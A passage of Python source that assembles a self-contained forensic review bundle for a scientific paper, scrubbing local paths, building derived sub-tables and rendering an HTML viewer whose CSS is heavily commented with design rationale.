        raise FileNotFoundError(f"not a directory: {review_dir}")
    paper_dir = Path(paper_dir) if paper_dir else review_dir.parent
    out = Path(out_dir) if out_dir else review_dir.parent / f"{review_dir.name}_bundle"
    (out / "paper").mkdir(parents=True, exist_ok=True)
    (out / "analysis").mkdir(parents=True, exist_ok=True)

    for name in _PAPER_FILES:
        src = paper_dir / name
        if src.exists():
            shutil.copy2(src, out / "paper" / name)
    for pattern in _PAPER_GLOBS:
        for src in sorted(paper_dir.glob(pattern)):
            shutil.copy2(src, out / "paper" / src.name)
    for pdf in sorted(paper_dir.glob("*.pdf")):
        shutil.copy2(pdf, out / "paper" / pdf.name)
    for name in _ANALYSIS_FILES:
        src = review_dir / name
        if not src.exists():
            continue
        if name == "report.md":
            # THE ONE ANALYSIS FILE A READER OPENS. It is the review itself, it
            # is what gets forwarded on its own, and its reproduction commands
            # carried the operator's home directory verbatim (5 lines of it on
            # the wave-3 eat.24415 report). Rewritten rather than copied; the
            # unscrubbed original stays in the review directory.
            (out / "analysis" / name).write_text(
                scrub(src.read_text(encoding="utf-8", errors="replace")),
                encoding="utf-8")
            continue
        shutil.copy2(src, out / "analysis" / name)
    for figdir in (review_dir / "figures", paper_dir / "figures"):
        if figdir.is_dir():
            shutil.copytree(figdir, out / "figures", dirs_exist_ok=True)

    # THE DERIVED SUB-TABLES, BUILT HERE IF NOBODY BUILT THEM. Greg,
    # 2026-08-29: "Otherwise the user will infer (like I did) that the table
    # extraction was flawed. Moreover, without seeing those subtables, I am
    # still not certain that all the table data was properly extracted."
    #
    # He inferred it because a composite table read as one flat grid LOOKS
    # broken, and because `table_package` shipped on 2026-08-27 with a CLI verb
    # and no pipeline caller -- so its output existed only if someone typed
    # `package-tables`, and nobody did. Built on demand here, cheap (0.27 s on a
    # nine-table paper) and idempotent.
    #
    # The blocks are a READING AID and never evidence: `table_package` stamps
    # every one `is_evidence: false` with provenance back to the printed table,
    # and a test asserts no block id ever appears in a value anchor. That
    # guarantee is what makes it safe to show them beside the report.
    try:
        from . import table_package as _tp

        pkg = _tp.build(paper_dir)
        tdir = paper_dir / _tp.PACKAGE_DIR
        if tdir.is_dir():
            shutil.copytree(tdir, out / "tables", dirs_exist_ok=True)
    except Exception as exc:                                  # noqa: BLE001
        # Said, not swallowed: a bundle without sub-tables is usable, a bundle
        # that silently omits them teaches the reader they do not exist.
        pkg = {"error": f"{type(exc).__name__}: {exc}"}

    payload = collect(review_dir, paper_dir)
    # A HOLLOW BUNDLE MUST FAIL, NOT SHIP. From v1.0.0 until 2026-08-22 a
    # bundle of a parallel-era run built "successfully" with zero finding
    # cards -- the reader got the report prose and the paper, and no
    # evidence -- because collect() read only the legacy filenames. The
    # degraded-result-reported-as-success shape is this repo's signature
    # defect; if the run's document has findings and the payload lost them
    # all, the build is wrong and must say so.
    _n_doc = len((_load(review_dir / "findings.v2.json") or {}).get("findings")
                 or [])
    if _n_doc and not payload.get("findings"):
        raise RuntimeError(
            f"hollow bundle: {review_dir}/findings.v2.json has {_n_doc} "
            "finding(s) but the payload built none -- the v2 adapter is "
            "broken; refusing to write a viewer with the evidence missing")
    # `printed` is every table as the walker read it; `blocks` are the derived
    # sections of the composite ones. A reader checking whether extraction was
    # complete needs both, and needs to be told which is which.
    # THE MARKDOWN TRAVELS INLINE. The bundle is a single self-contained file a
    # reviewer opens off a USB stick; a pane that says "open tables/printed/03.md"
    # is a pane that does not work. Read once here rather than fetched, because
    # the viewer has no network and `file://` blocks XHR anyway.
    def _inline(rows):
        out = []
        for r in list(rows or []):
            r = dict(r)
            try:
                r["_md"] = (paper_dir / _tp.PACKAGE_DIR / r["file"]).read_text(
                    encoding="utf-8")
            except Exception:                                 # noqa: BLE001
                r["_md"] = None       # the pane falls back to naming the file
            out.append(r)
        return out

    payload["tables_package"] = {
        "printed": _inline((pkg or {}).get("printed")),
        "blocks": _inline((pkg or {}).get("blocks")),
        "error": (pkg or {}).get("error"),
        "note": (pkg or {}).get("note"),
    }
    pdfs = _ordered_pdfs(paper_dir)
    payload["pdf_pages"], payload["pdf_docs"] = render_all_pdfs(pdfs, out)
    # Built HERE and not in `collect`, for the same reason the page images are:
    # it writes into the output directory (an image supplement is COPIED into
    # `docs/`), and `collect` does not own one. Scrubbed like everything else --
    # a supplement's rendered text can carry a path from the operator's machine
    # as easily as a tool result can.
    payload["source_docs"] = [_scrub_document(d)
                              for d in source_documents(paper_dir, out,
                                                        payload["pdf_docs"])]
    (out / "viewer.html").write_text(render_viewer(payload), encoding="utf-8")
    (out / "README.txt").write_text(
        "Forensic review bundle\n"
        "======================\n\n"
        "Open viewer.html in any browser. It is self-contained -- no network,\n"
        "no server, no install. Double-clicking it works.\n\n"
        "  paper/     the original PDF and the text extracted from it\n"
        "  analysis/  every file the review produced, including the raw logs\n"
        "  figures/   extracted figures, if figure extraction was enabled\n\n"
        "BEFORE FORWARDING THIS BUNDLE: viewer.html and analysis/report.md have\n"
        "had local paths, session ids and run cost removed. The raw logs beside\n"
        "them -- toolcalls.*.json, messages.*.json, report.json, run_meta.json --\n"
        "are the unedited record and still contain all of it. They are kept\n"
        "verbatim on purpose, because an audit trail that has been rewritten is\n"
        "not one. Delete analysis/ if you are sending this outside your group.\n\n"
        + DISCLAIMER_SHORT + "\n",
        encoding="utf-8",
    )
    return out


def _finite(value: Any) -> Any:
    """Replace every non-finite float with None, everywhere in the payload.

    A forensic check that could not compute a value -- a divide-by-zero, the SD
    of a single observation -- yields NaN, so this is reachable from ordinary
    input. Null is the honest rendering (the value is undefined) and the
    viewer's `val()` already shows null as blank.
    """
    if isinstance(value, float):
        return value if math.isfinite(value) else None
    if isinstance(value, dict):
        return {k: _finite(v) for k, v in value.items()}
    if isinstance(value, (list, tuple)):
        return [_finite(v) for v in value]
    return value


#: Fields whose contents are text COPIED VERBATIM FROM THE PAPER, and therefore
#: the only fields it is correct to HTML-decode on the way to the reader.
#:
#: MEASURED 2026-08-17 across the archived runs: 59 entity-carrying strings in
#: the PNAS `findings.json` alone, in exactly three keys -- `quote` 31,
#: `provenance_quote` 21, `source_quote` 4.
#:
#: The list is NAMED rather than a blanket walk, and that restriction is the
#: whole design. `&` is a perfectly ordinary character in model prose, so
#: decoding every string in the payload would silently rewrite explanatory text
#: that never came from the paper at all. These three keys carry a promise --
#: "this is what the paper printed" -- and `&lt;` breaks that promise, because
#: the paper printed `<`. The entity is our extractor's encoding, not the
#: author's text.
_SOURCE_TEXT_KEYS = ("quote", "source_quote", "provenance_quote")


def _decode_source_text(obj):
    """Decode HTML entities in quoted-from-the-paper fields, recursively.

    THE VIEWER MAKES THIS WORSE THAN THE MARKDOWN DID, which is why it needs
    its own fix rather than inheriting `report_render._quote_line`'s. The
    viewer's JS runs every quote through `esc()` before insertion -- correct,
    and not negotiable, since the text is model-supplied and goes into innerHTML.
    But `esc()` on a string that already reads `P &lt; 0.05` escapes the
    ampersand again, producing `P &amp;lt; 0.05`, which the browser renders as
    the literal characters `P &lt; 0.05` on screen. Decoding here, once, before
    serialisation, means `esc()` receives a real `<` and escapes it exactly
    once, and the reader sees what the paper said.

    Decode BEFORE escape, never instead of it.
    """
    if isinstance(obj, dict):
        return {k: (_html_unescape(v) if k in _SOURCE_TEXT_KEYS and isinstance(v, str)
                    else _decode_source_text(v))
                for k, v in obj.items()}
    if isinstance(obj, list):
        return [_decode_source_text(v) for v in obj]
    return obj


def _html_unescape(text: str) -> str:
    return html.unescape(text)


def render_viewer(payload: dict) -> str:
    """The self-contained viewer. All data inline; large artefacts linked.

    NOTE for anyone editing `_VIEWER_TEMPLATE`: the section builders are JS
    TEMPLATE LITERALS, so a backtick anywhere inside one -- including inside an
    HTML comment -- terminates the string and breaks the whole page with a
    syntax error. Use plain quotes in comments there.

    The severity table column is headed "findings", never "n": in a document
    about statistical rigour `n` means sample size, and using it for a tally of
    findings is the exact category error this toolkit exists to catch.
    """
    # `allow_nan=False` makes json.dumps RAISE on a non-finite float rather than
    # emit the bare `NaN`/`Infinity` tokens, which are not valid JSON and which
    # the browser's strict `JSON.parse` rejects -- blanking the whole page,
    # since every section reads from one parsed payload. This is the last line
    # of defence (the payload is scrubbed upstream too); rendering a payload
    # that was never scrubbed, or one an unscrubbed key let through, still
    # cannot ship an unparseable page.
    data = json.dumps(_finite(_decode_source_text(payload)), default=str,
                      allow_nan=False).replace("</", "<\\/")
    title = html.escape(payload.get("paper_title") or payload.get("paper_id") or "Review")
    # The severity ladder comes from severity.py rather than being written out
    # a sixth time in JS, where nothing would catch it drifting.
    order = json.dumps({level: i for i, level in enumerate(SEVERITY_LEVELS)})
    levels = json.dumps(list(SEVERITY_LEVELS))
    # Stored identifiers (producer values, stage labels, channel keys) shown to
    # a reader by their display names -- the one alias table, `names.py`.
    from .names import display_names
    names_js = json.dumps(display_names()).replace("</", "<\\/")
    return (_VIEWER_TEMPLATE
            .replace("__TITLE__", title)
            .replace("__SEVERITY_ORDER__", order)
            .replace("__SEVERITY_LEVELS__", levels)
            .replace("__DISPLAY_NAMES__", names_js)
            .replace("__DATA__", data))


_VIEWER_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>__TITLE__ -- forensic review</title>
<style>
/* Deliberately plain: a rendered markdown document, not a dashboard. No cards,
   no rounded panels, no coloured chips. Severity is conveyed by a word and a
   rule, which is how a journal would do it. */
/* `--ok` exists only for research PRACTICE, which is the one place this
   document reports good news. Severity has no level for "this was done well",
   and borrowing one would imply a finding where there is none. */
/* `--hit` is the highlight ground. It was USED and never DEFINED, so the
   inline fallback was the only value that ever applied and no theme could
   change it -- which is how dark mode ended up painting #e4e4e4 text on a
   cream highlight. The value is deliberately the SAME in both themes, because
   the rule that paints it also pins a dark foreground: a highlight that
   inverts with the theme is a highlight that has to be re-checked twice. */
:root{ --bg:#fff; --fg:#111; --muted:#555; --rule:#d8d8d8; --link:#0645ad;
       --code:#f5f5f5; --flag:#8a1c12; --warn:#8a5200; --ok:#1d6b3f;
       --hit:#fdf3c8; }
@media (prefers-color-scheme: dark){
  :root{ --bg:#121212; --fg:#e4e4e4; --muted:#a0a0a0; --rule:#333;
         --link:#7aa6da; --code:#1c1c1c; --flag:#e08b7f; --warn:#d3a04a;
         --ok:#6fb98a; --hit:#fdf3c8; } }
:root[data-theme="dark"]{ --bg:#121212; --fg:#e4e4e4; --muted:#a0a0a0; --rule:#333;
  --link:#7aa6da; --code:#1c1c1c; --flag:#e08b7f; --warn:#d3a04a; --ok:#6fb98a;
  --hit:#fdf3c8; }
:root[data-theme="light"]{ --bg:#fff; --fg:#111; --muted:#555; --rule:#d8d8d8;
  --link:#0645ad; --code:#f5f5f5; --flag:#8a1c12; --warn:#8a5200; --ok:#1d6b3f;
  --hit:#fdf3c8; }
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);
  font:16px/1.6 Georgia,"Times New Roman",serif}
a{color:var(--link)}
#wrap{display:flex;align-items:flex-start}
nav{width:210px;flex:0 0 210px;padding:24px 0 40px;position:sticky;top:0;
  height:100vh;overflow-y:auto;border-right:1px solid var(--rule);
  font-family:system-ui,-apple-system,"Segoe UI",sans-serif;font-size:13px;
  transition:width .12s ease}
body.navhid nav{width:0;flex-basis:0;padding:0;overflow:hidden;border-right:0}
#navtoggle{position:fixed;top:8px;left:8px;z-index:20;font:12px system-ui,sans-serif;
  background:var(--bg);color:var(--muted);border:1px solid var(--rule);
  padding:3px 8px;cursor:pointer;line-height:1}
nav b{display:block;padding:0 18px 8px;color:var(--muted);font-weight:600;
  text-transform:uppercase;letter-spacing:.08em;font-size:11px}
/* FLEX, NOT FLOAT. The count used to be `float:right` inside a block anchor,
   and a float only stays on the line if the line has room for it. "Questions
   for the authors" fills the sidebar, so its `7` was pushed past that anchor's
   single-line box and rendered ON THE ROW BELOW -- landing beside the Findings
   count as `9` with a superscript `7`, while its own row appeared to have no
   count at all. Found only by looking at the rendered page: the DOM is
   correct, one badge per anchor, every number right. Flex keeps the badge
   inside its own anchor whatever the label's length, and `baseline` keeps it
   on the first line when a label wraps. */
nav a{display:flex;justify-content:space-between;align-items:baseline;gap:10px;
  padding:4px 18px;color:var(--fg);text-decoration:none}
nav a:hover{text-decoration:underline}
nav a.active{font-weight:700}
nav .c{color:var(--muted);flex:none;font-variant-numeric:tabular-nums}
main{flex:1;min-width:0;padding:24px 40px 120px;max-width:60em}
section{display:none} section.on{display:block}
h1{font-size:26px;margin:0 0 2px;font-weight:normal}
h2{font-size:21px;margin:26px 0 6px;font-weight:normal;
   border-bottom:1px solid var(--rule);padding-bottom:4px}
h3{font-size:17px;margin:20px 0 4px;font-weight:700}
h4{font-size:15px;margin:14px 0 3px}
p{margin:8px 0}
.muted{color:var(--muted);font-size:14px}
/* The `Tables as read` pane. A printed table and its derived sections are the
   same shape, so they share one style -- but the derived one is always
   introduced by a line naming it as derived, never by styling alone, because a
   reader must not have to learn a colour to know what is evidence. */
.tblpkg{margin:0 0 10px;border:1px solid var(--rule);border-radius:6px;padding:8px 12px}
.tblpkg>summary{cursor:pointer}
.tblmd{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;
  line-height:1.5;overflow-x:auto;background:var(--code);
  border:1px solid var(--rule);padding:10px 12px;margin:6px 0 12px;white-space:pre}
/* THE HOVER NETWORK. A printed value is the anchor; hovering it lights
   up every other value that belongs with it -- its group siblings, the
   same number printed elsewhere, and the `n` that permitted its check.
   `cursor:help` because hovering is the affordance and there is nothing
   to click. */
.val{border-bottom:1px dotted var(--muted);cursor:help}
.val.vhot{background:#fde68a;color:#1f2937;border-radius:3px;box-shadow:0 0 0 2px #fde68a}
.val.vself{background:#fbbf24;color:#1f2937;border-radius:3px;box-shadow:0 0 0 2px #fbbf24}
.vcls{font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted);margin-left:6px}
/* The one sentence a reader must not skip in a section whose heading is a
   count. Full size and full contrast, deliberately -- `.muted` would sink it
   below the number it exists to qualify. */
.lede{font-size:16px;margin:10px 0 14px}
table{border-collapse:collapse;width:100%;margin:8px 0;font-size:14px;
  font-family:system-ui,-apple-system,sans-serif}
th,td{border:1px solid var(--rule);padding:5px 8px;text-align:left;vertical-align:top}
th{font-weight:600;background:transparent;cursor:pointer;white-space:nowrap}
th:after{content:"";color:var(--muted);font-size:10px}
th.asc:after{content:" \25B2"} th.desc:after{content:" \25BC"}
.scroll{overflow-x:auto}
/* Key/value block: row headers down the left, no header row at all, and no
   sort cursor because there is nothing to sort a fixed schema into. */
table.kv th{width:1%;white-space:nowrap;font-weight:600;cursor:default;
  color:var(--muted)}
table.kv th:after{content:""}
table.kv td{width:99%}
/* File tree. Indentation carries the directory, so the directory name is not
   repeated on every row. */
ul.tree{list-style:none;padding-left:0;margin:8px 0;font-size:14px}
ul.tree ul{list-style:none;padding-left:18px;margin:0;
  border-left:1px solid var(--rule)}
ul.tree li{padding:2px 0}
ul.tree .dir{font-weight:600}
ul.tree .what{color:var(--muted);margin-left:8px}
/* Sankey. Ribbons take the severity colour of the verdict they flow into, so
   the diagram reads the same way as the rest of the document. */
svg.sankey{min-width:640px;font-family:system-ui,sans-serif;font-size:11px}
svg.sankey text{fill:var(--fg)}
svg.sankey .node{fill:var(--muted)}
svg.sankey rect.impossible,svg.sankey rect.highly_suspicious{fill:var(--flag)}
svg.sankey rect.suspicious{fill:var(--warn)}
svg.sankey .ribbon{fill:var(--muted);opacity:.30}
svg.sankey .ribbon:hover{opacity:.62}
svg.sankey .ribbon.impossible,svg.sankey .ribbon.highly_suspicious{fill:var(--flag)}
svg.sankey .ribbon.suspicious{fill:var(--warn)}
code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
code{background:var(--code);padding:0 3px;font-size:13px}
pre{background:var(--code);padding:9px 11px;overflow-x:auto;font-size:13px;
  white-space:pre-wrap;word-break:break-word;border-left:2px solid var(--rule);margin:6px 0}
blockquote{margin:8px 0;padding:2px 0 2px 14px;border-left:2px solid var(--rule);
  color:var(--muted)}
.finding{border:1px solid var(--rule);border-left:3px solid var(--flag);
  padding:14px 18px;margin:14px 0}
.finding.consistent,.finding.indeterminate{border-left-color:var(--rule)}
.finding h3{margin:4px 0 2px;font-size:16px;font-weight:600}
.finding p.sub{margin:0 0 6px;font-size:13.5px;color:var(--muted)}
/* The plain reading sits ABOVE the technical detail and in the body colour, so
   a reader who cannot use the statistics never has to scroll past them to find
   out whether the paper's claim survives. */
.finding p.plain{margin:2px 0 6px;font-size:14.5px}
/* Severity words are set in the body face at body size. They were 11px, bold,
   letter-spaced and UPPERCASE, which made every occurrence of the word shout
   -- including inside running table cells where it is just a value like any
   other. Colour alone carries the level; the rule weights below carry it again
   for anyone who cannot use the colour. */
.sev{color:var(--flag)}
.sev.consistent,.sev.indeterminate{color:var(--muted)}
/* Per level, not just flagged-vs-muted. The rule above was binary, so an
   `impossible` finding and a `suspicious` one were drawn identically and the
   only thing separating them was the word itself. Rule WEIGHT carries the
   ladder, so the distinction survives greyscale printing and colour-blind
   readers; the amber for `suspicious` additionally keeps the two accusatory
   levels visually apart from the one that is merely a query. */
.finding.impossible{border-left-width:6px}
.finding.highly_suspicious{border-left-width:4px}
.finding.suspicious{border-left-width:2px;border-left-color:var(--warn)}
.sev.suspicious{color:var(--warn)}
/* Coded words carry their definition in a title. The dotted underline is the
   affordance that one is there, and the help cursor says the word answers a
   question; clicking jumps to the codebook (the data-cb handler at the end
   of the script). Without a visible cue a hover glossary is invisible, which
   is the same as absent. */
.sev[title],.def[title]{cursor:help;text-decoration:underline dotted;
  text-underline-offset:2px}
/* The headline sentence. Set at reading size in the body face, NOT enlarged:
   it is the review's one-sentence conclusion, and a display size would make it
   a pull quote -- which is exactly the register a document about restraint
   must not use for its most accusatory sentence. */
p.headline{margin:6px 0 10px;font-size:16.5px}
/* What the review could not do. Deliberately the same weight as everything
   else on the page: an apologetics box, greyed and boxed off, is read as
   boilerplate and skipped, and these lines are load-bearing. */
ul.limits{margin:8px 0;padding-left:20px;font-size:14.5px}
ul.limits li{margin:5px 0}
/* One integrity card. `summary` carries the tool name and its evidence class;
   everything that qualifies the class is inside, one click down. */
details.card{border-left:2px solid var(--rule);padding:2px 0 2px 12px;margin:8px 0}
details.card summary{cursor:pointer}
details.card .ev{color:var(--muted);font-family:system-ui,sans-serif;font-size:13px}
details.card ul{margin:4px 0 8px 18px;padding:0}
details.card li{margin:3px 0}
table.cardparams{font-size:13px}
/* What a finding CHANGES, printed beside how wrong it is. A consequence a
   tool computed is set in the body colour; one the model asserted stays
   muted, so the two are never read as carrying the same weight. */
.conseq{font-family:system-ui,sans-serif;font-size:12.5px;color:var(--muted);
  margin:6px 0 0}
.conseq.computed{color:var(--fg)}
.conseq b{font-weight:600}
/* A tool result overruled with no reason given. Marked, not hidden. */
.conseq.unexplained{color:var(--flag)}
dl{display:grid;grid-template-columns:10.5em 1fr;gap:6px 16px;margin:10px 0;
  font-size:14px;align-items:baseline}
dt{color:var(--muted);font-family:system-ui,sans-serif;font-size:12.5px;
  text-transform:uppercase;letter-spacing:.04em}
dd{margin:0;min-width:0}
/* Nested key/value pairs render as aligned rows with NO borders. Bordered
   sub-tables inside a definition list made several independent tables look
   like one broken one, with cell edges landing at different positions. */
.kvlist{display:grid;grid-template-columns:auto 1fr;gap:1px 12px;margin:0}
.kvlist .k{color:var(--muted);font-size:13px;white-space:nowrap}
.kvlist .v{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px}
.finding ul{margin:2px 0 2px 16px;padding:0}
.finding li{margin:2px 0}
.tools{margin:6px 0 4px;font-family:system-ui,sans-serif;font-size:13px}
input[type=search],select{font:13px system-ui,sans-serif;padding:4px 6px;
  border:1px solid var(--rule);background:var(--bg);color:var(--fg)}
details{margin:4px 0;border-bottom:1px solid var(--rule)}
summary{cursor:pointer;padding:5px 0;font-family:system-ui,sans-serif;font-size:13.5px}
#theme{position:fixed;top:8px;right:12px;font:11px system-ui,sans-serif;
  background:var(--bg);color:var(--muted);border:1px solid var(--rule);
  padding:3px 8px;cursor:pointer}
/* Resizable, PDF two-thirds by default: the PDF is the thing being read and
   the text is the thing being checked against it. */
.split{display:flex;height:80vh;min-height:420px}
.split>div{min-width:0;display:flex;flex-direction:column;border:1px solid var(--rule)}
#pane-pdf{flex:0 0 66%} #pane-txt{flex:1 1 auto}
#dragbar{flex:0 0 7px;cursor:col-resize;background:transparent;position:relative}
#dragbar:before{content:"";position:absolute;left:3px;top:0;bottom:0;width:1px;
  background:var(--rule)}
#dragbar:hover:before,#dragbar.on:before{background:var(--link);width:2px}
.split h4{margin:0;padding:5px 8px;border-bottom:1px solid var(--rule);
  font-family:system-ui,sans-serif;font-size:12px;color:var(--muted);font-weight:600}
.split .pane{flex:1;overflow:auto;min-height:0}
.split embed,.split iframe{width:100%;height:100%;border:0}
.pdfpage{position:relative;margin:0 auto 10px;width:100%;max-width:900px}
.pdfpage img{display:block;width:100%;height:auto}
.pdfpage .ln{position:absolute;cursor:pointer}
.pdfpage .ln:hover{background:rgba(255,214,0,.28)}
.pdfpage .ln.hit{background:rgba(255,214,0,.55);outline:1px solid #d4a200}
.pgnum{font:11px system-ui,sans-serif;color:var(--muted);padding:2px 4px}
/* The source pane for documents that are NOT PDFs. A supplement can be an
   image, a publisher HTML page, an EPUB, a spreadsheet or plain text, and each
   one is shown on its own terms rather than as an empty PDF viewer. */
.docimg{display:block;max-width:100%;height:auto;margin:0 auto}
.docbody{padding:8px 12px;font-size:12.5px;font-family:system-ui,sans-serif}
.docbody table{border-collapse:collapse;font-size:.95em}
.docbody th,.docbody td{border:1px solid var(--rule);padding:3px 6px}
.docbody h4.epubdoc{margin:12px 0 4px;font:600 11px system-ui,sans-serif;
  color:var(--muted);border-bottom:1px solid var(--rule)}
/* The highlight the DOM-based click sync lands on, in the source pane. Carries
   its own foreground for the same reason `mark.hit` does: a background alone
   inherits the page colour and paints pale-on-pale in dark mode, exactly when
   the reader is following a finding to its source. */
.srchit,.srchit *{background:#ffe066;color:#111}
/* WHY A DOCUMENT COULD NOT BE SHOWN. Never silent: an empty pane reads as an
   empty document, and for a supplement that is the difference between "the
   authors published nothing" and "our reader could not open it". */
.docnote,.docfail{font:12px system-ui,sans-serif;padding:8px 12px;color:var(--muted)}
.docfail{border-top:1px solid var(--rule);background:var(--code)}
.docfail p{margin:0 0 6px}
#srcsync,#srctxtdoc{font-weight:400;font-size:11px}
/* A HIGHLIGHT CARRIES ITS OWN FOREGROUND, in both themes.
   Setting only a background inherits the page's text colour, so in dark mode
   the row flash painted pale-on-pale and the highlighted row became the LEAST
   readable thing on screen -- the exact opposite of what a highlight is for.
   `mark.hit` always set `color`; `tr.flash` did not, and `tr.flash` is what
   click-to-jump uses, so the failure appeared precisely when a reader followed
   a finding to its source in the paper. Descendants are forced as well: a cell
   containing a styled span would otherwise keep its own light colour and stay
   invisible on the yellow. */
mark.hit,mark.hit *{background:#ffe066;color:#111}
tr.flash td,tr.flash td *{background:#ffe066;color:#111}
/* SAME BUG, TWO MORE PLACES, found 2026-08-10 by reading the rendered pane
   rather than the CSS. `.blk.hit` and `.tgt` -- the block the text-search sync
   lands on, and the table a finding jumps to -- both set a cream background
   through `var(--hit,#fdf3c8)` and no foreground. `--hit` is defined NOWHERE,
   so the fallback is the only value that ever applies, and in dark mode it put
   #e4e4e4 text on a #fdf3c8 ground. These are the two highlights a reader hits
   when they follow a finding into the paper, which is the one moment the
   highlight has a job to do. */
.rendered .blk.hit,.rendered .blk.hit *,
.rendered .tgt,.rendered .tgt *{color:#111}
/* Practice marks. Colour is the SEMANTIC scale, separate from severity: a
   practice followed is good news, which no severity level expresses. */
.mark{font-weight:600}
.mark.yes{color:var(--ok)} .mark.no{color:var(--flag)}
.mark.partial{color:var(--warn)} .mark.unknown{color:var(--muted)}
.split pre{margin:0;border:0;background:transparent;padding:8px 10px;font-size:12.5px}
/* Rendered markdown in the extraction pane. Tables get borders because the
   whole point of this view is seeing whether the table survived extraction. */
.rendered{padding:8px 12px;font-size:12.5px;font-family:system-ui,sans-serif}
.rendered table{font-size:.95em}
.rendered th,.rendered td{border:1px solid var(--rule);padding:3px 6px;cursor:default}
.rendered th:after{content:""}
.rendered h1,.rendered h2,.rendered h3{font-size:1.05em;margin:10px 0 4px}
/* The controls above the panes. */
.srcbar{display:flex;align-items:center;gap:7px;flex-wrap:wrap;margin:6px 0}
.srcbar label{font:12px system-ui,sans-serif;color:var(--muted)}
.srcbar .spacer{flex:1 1 auto}
.preview{display:flex;flex-direction:column;gap:1px;margin:0 0 6px;max-height:190px;
  overflow:auto;border:1px solid var(--rule)}
.preview button{text-align:left;font:12px ui-monospace,SFMono-Regular,Menlo,monospace;
  background:transparent;color:var(--fg);border:0;border-bottom:1px solid var(--rule);
  padding:4px 8px;cursor:pointer;white-space:pre;overflow:hidden;text-overflow:ellipsis}
.preview button:hover{background:var(--code)}
/* Figures sit BELOW both panes, spanning their width -- a third vertical
   column would squeeze the two that carry the actual comparison. Always
   present, empty state included: the review is figure-blind without it, and
   the reader should be told so rather than shown nothing. */
.figstrip{border:1px solid var(--rule);border-top:0}
.figstrip h4{margin:0;padding:5px 8px;border-bottom:1px solid var(--rule);
  font-family:system-ui,sans-serif;font-size:12px;color:var(--muted);font-weight:600}
.figstrip .pane{display:flex;gap:12px;overflow-x:auto;padding:8px;align-items:flex-start}
figure.fstrip{margin:0;flex:0 0 auto;max-width:320px}
figure.fstrip img{max-width:100%;height:auto;border:1px solid var(--rule)}
figure.fstrip figcaption{font:11.5px system-ui,sans-serif;margin-top:4px}
/* A table in the strip is the extraction's own cell grid, shown beside the
   figures because "did this survive extraction" is the same question for
   both, and a table that lost a column is the more consequential loss. */
/* The card holds the WHOLE table and scrolls. It used to hold a 14x10 corner
   with every cell cut to 40 characters, which on a 73-row table showed 19% of
   the evidence under the label "trimmed for this card". A pane whose purpose is
   letting a reader check a finding against the source cannot be the thing that
   withholds the source. Scrolling keeps the strip usable without dropping a
   cell; `open` puts the table on its own page for close reading. */
figure.fstrip .tgrid{max-height:260px;overflow:auto;border:1px solid var(--rule)}
figure.fstrip .tgrid table{white-space:nowrap}
figure.fstrip .tgrid.empty{padding:8px;font:12px system-ui,sans-serif;
  border-left:3px solid var(--flag);color:var(--fg)}
/* ORIGINAL vs PROCESSED. Both are in the DOM; the toggle swaps which is shown,
   so the two are guaranteed to be the SAME grid in the same slots -- the point
   of the view is that a reader can trust the alignment. */
figure.fstrip .prcell{display:none}
figure.fstrip.showproc .rawcell{display:none}
figure.fstrip.showproc .prcell{display:inline;font:11px ui-monospace,monospace}
figure.fstrip.showproc .prcell.dead{text-decoration:line-through;color:var(--flag);
  opacity:.85}
figure.fstrip .pnote{padding:4px 2px;font:11px system-ui,sans-serif}
figure.fstrip .parsewarn{padding:6px 8px;margin-top:4px;font:12px system-ui,sans-serif;
  border-left:3px solid var(--flag);background:rgba(180,60,60,.06);color:var(--fg)}
a.popout{margin-left:6px;font:11px system-ui,sans-serif;text-decoration:none;
  border:1px solid var(--rule);border-radius:3px;padding:0 4px;color:var(--muted)}
a.popout:hover{color:var(--link);border-color:var(--link)}
/* The table's own footnotes, under the table, where the paper puts them. */
.tfoot{margin-top:4px;font-size:11.5px;color:var(--muted);display:flex;
  flex-direction:column;gap:2px}
.tfoot b{color:var(--fg)}
figure.fstrip table{border-collapse:collapse;font:11px ui-monospace,SFMono-Regular,Menlo,monospace}
figure.fstrip td{border:1px solid var(--rule);padding:2px 5px;white-space:nowrap}
figure.fstrip tr:first-child td{position:sticky;top:0;background:var(--code);font-weight:600}
/* The rendered block the sync last landed on. Marking the BLOCK rather than
   the words is the only option there: the rendered DOM has no character
   offsets, which is why each block carries the one it started at. */
.rendered .blk.hit{background:var(--hit,#fdf3c8);outline:2px solid var(--flag);
  outline-offset:1px;scroll-margin:80px}
.rendered .tgt{background:var(--hit,#fdf3c8);outline:2px solid var(--flag);
  outline-offset:2px;scroll-margin:80px}
/* Nested evidence. Indented and rule-marked so a reader can see at a glance
   that these belong to the finding above rather than standing beside it. */
details.evidence{margin:8px 0 0;border-top:1px solid var(--rule);padding-top:6px}
details.evidence>summary{cursor:pointer;font:12px system-ui,sans-serif;color:var(--muted)}
details.evidence[open]>summary{margin-bottom:6px}
details.evidence .finding{margin-left:14px;border-left:2px solid var(--rule)}
.note{border-left:3px solid var(--flag);padding:6px 12px;margin:12px 0;font-size:14.5px}
/* THE WORKING, SHOWN -- deliberately not styled as a finding. A dashed rule and
   the page's own text colour, never the severity palette: this is arithmetic
   that failed as printed and was then explained, not an accusation. Giving it
   accusation colour would reintroduce, as design, the escalation the severity
   ladder was careful to avoid. */
/* A section banner is STRUCTURE. It gets the table's own emphasis rather than a
   colour, because it says nothing about whether anything is wrong -- the
   severity palette is reserved for claims about the paper. */
tr.banner td{font-weight:600;background:var(--code);border-top:2px solid var(--rule);
  text-align:left;padding:5px 8px}
details.secnote{margin:6px 0 0}
details.secnote>summary{cursor:pointer;font:12px system-ui,sans-serif}
/* PRINT.
   The integrity officer this document is partly for does not read HTML; they
   read a paper copy in a meeting, and they hand it to someone who was not in
   the room. Two consequences drive everything below.

   FIRST, the sections are built LAZILY -- `built{}` fills in only as a reader
   clicks -- so printing without forcing a build produces a document containing
   whatever happened to have been opened. That is worse than no print support:
   it looks complete. `printAll()` builds every section first.

   SECOND, a printed page travels without its context. Every sheet therefore
   carries the paper's short cite, the run date, and the disclaimer, because a
   page cropped out of the middle of this document and circulated is exactly
   the route by which an automated flag becomes an accusation nobody qualified.
   That is the same argument as the screenshot test, applied to paper. */
@media print{
